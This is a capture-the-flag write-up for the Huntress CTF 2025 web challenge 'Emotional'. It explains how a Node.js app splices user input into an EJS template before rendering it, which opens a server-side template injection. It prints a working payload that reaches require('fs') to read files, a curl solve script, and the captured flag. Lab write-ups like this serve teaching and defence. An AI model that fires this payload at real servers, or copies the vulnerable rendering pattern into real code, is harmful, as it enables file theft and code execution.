# Huntress CTF 2025 - 🌐 Emotional

- **Team:** r4ph3cks
- **Date:** 06/10/2025

## Challenge Information

- **Category:** 🌐 Web

- **Description:**
> Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.

- **Author:** [John Hammond](https://www.youtube.com/@_JohnHammond)

- **Given:** Website URL and source code in [`emotional.zip`](assets/emotional.zip)

## Analysis and Solution

Given a web application that allows users to set and display emojis representing their emotions. The challenge also provides the complete source code in [`emotional.zip`](assets/emotional.zip), which includes the Node.js server implementation, EJS templates, and configuration files.

### Initial Analysis

Upon accessing the web application, we see an emoji selection interface where users can choose different emojis to represent their emotions. The application appears to be built with Node.js and uses EJS templating.

Having access to the source code significantly helps in identifying potential vulnerabilities. The [`emotional.zip`](assets/emotional.zip) file contains:

- [`server.js`](assets/emotional/server.js) - Main Node.js application server
- [`package.json`](assets/emotional/package.json) - Dependencies (Express, EJS)
- [`views/index.ejs`](assets/emotional/views/index.ejs) - EJS template file
- [`public/`](assets/emotional/public/) - Static assets directory
- [`flag.txt`](assets/emotional/flag.txt) - The target file we need to read
- [`Dockerfile`](assets/emotional/Dockerfile) - Container configuration

Examining the critical vulnerability in `server.js`:

```javascript
app.post('/setEmoji', (req, res) => {
    const { emoji } = req.body;
    profile.emoji = emoji;
    res.json({ profileEmoji: emoji });
});

app.get('/', (req, res) => {
    fs.readFile(path.join(__dirname, 'views', 'index.ejs'), 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Internal Server Error');
        }
        
        const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);
        const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
        res.send(renderedHtml);
    });
});
```

The vulnerability is immediately apparent in line 33: the server performs a direct string replacement of `<% profileEmoji %>` with the user-controlled `profile.emoji` value, then passes this modified template to EJS for rendering.

### Template Injection Vulnerability

This code pattern creates a classic Server-Side Template Injection (SSTI) vulnerability:

1. User input (`emoji` parameter) is stored in `profile.emoji`
2. The template content is read and user input is directly substituted using `replace()`
3. The modified template is then processed by EJS without any sanitization

The key insight is that the server replaces `<% profileEmoji %>` in the template with the user-controlled `profile.emoji` value. This allows injection of EJS template code that will be executed when the template is rendered.

### Payload Development

Initially, attempting a straightforward approach fails:

```javascript
<% const fs = require('fs'); %>
```

This fails because `require` is not directly available in the EJS template execution context.

After several attempts with different methods to access `require`, the successful payload uses:

```javascript
<%- global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>
```

This works because:
- `global` is the Node.js global object, always available
- `process` is accessible through `global`
- `mainModule` refers to the main application module (server.js)
- `require` is available through the main module's context
- `<%-` executes the code and renders the result without HTML escaping

### Flag Extraction

The final exploitation process is implemented in [`solve.sh`](assets/solve.sh):

```bash
#!/bin/bash

token=$1
payload="<%- global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>"

# Send payload to inject template code
curl -s -X POST 'https://4d8e1cae.proxy.coursestack.com/setEmoji' \
-b "token=$token" \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode "emoji=$payload" > /dev/null

# Get the page and extract the flag from the rendered content
curl -s 'https://4d8e1cae.proxy.coursestack.com/' \
-b "token=$token" | grep -oE 'flag\{[^}]+\}'
```

1. Send a POST request to `/setEmoji` with the malicious EJS payload
2. Make a GET request to `/` where the template is rendered
3. Extract the flag from the rendered HTML

To use the solve script:
```bash
./assets/solve.sh <your_session_token>
```

Running this script gives us the flag:

Flag:

```
flag{8c8e0e59d1292298b64c625b401e8cfa}
```

## Observations

This challenge excellently demonstrates the dangers of Server-Side Template Injection in Node.js applications. The vulnerability pattern - directly substituting user input into template strings before processing - is unfortunately common in real-world applications.

Key learning points:
1. **Template engines are powerful**: EJS can execute arbitrary JavaScript, making injection attacks particularly dangerous
2. **Context matters**: Understanding how `require` works in different Node.js contexts is crucial for exploitation
3. **Defense in depth**: Input validation, output encoding, and sandboxing are all necessary to prevent SSTI
4. **Common anti-pattern**: Direct string replacement in templates without sanitization is a red flag

The challenge progresses logically from identifying the vulnerability to developing a working payload, making it an excellent educational example of SSTI exploitation techniques in Node.js environments.